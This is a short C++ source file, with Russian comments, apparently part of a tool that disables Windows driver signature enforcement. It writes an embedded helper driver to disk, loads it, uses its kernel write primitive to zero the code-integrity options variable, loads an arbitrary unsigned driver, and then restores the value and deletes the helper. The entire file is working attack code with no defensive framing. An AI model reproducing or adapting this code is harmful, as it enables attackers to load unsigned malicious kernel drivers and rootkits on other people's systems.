#include "global.h"

// загрузка драйвера провайдера
void prov::drvLoadPrv () {
	prvDrvCreate();
	loadDriver(m_info_.driverPath);
	m_hDevice = CreateFileW(m_info_.symbolicPath.c_str(), GENERIC_ALL, 0, nullptr, OPEN_EXISTING, 0, 0);
	chandle(m_hDevice);
}

// выгрузка
void prov::drvUnloadPrv () {
	CloseHandle(m_hDevice);
	unloadDriver(m_info_.driverPath);
	ctrue(DeleteFile(m_info_.driverPath.c_str()));
}

void prov::drvload (IN const path& drvPath) {
	void* pCiOptions = ntGetCiOptions();

	drvLoadPrv();
	char oldValue = 0, newValue = 0;
	write(&newValue, pCiOptions, sizeof(newValue), &oldValue);
	loadDriver(drvPath);
	write(&oldValue, pCiOptions, sizeof(newValue), &oldValue);
	drvUnloadPrv();
}

void prov::prvDrvCreate () {
	if (exists(m_info_.driverPath))
		return;

	HANDLE hFile = CreateFileW(m_info_.driverPath.c_str(), GENERIC_ALL, 0, nullptr, CREATE_NEW, 0, nullptr);
	chandle(hFile);

	ctrue(WriteFile(hFile, m_info_.pBinary, m_info_.sizeBinary, nullptr, nullptr));
	CloseHandle(hFile);
}
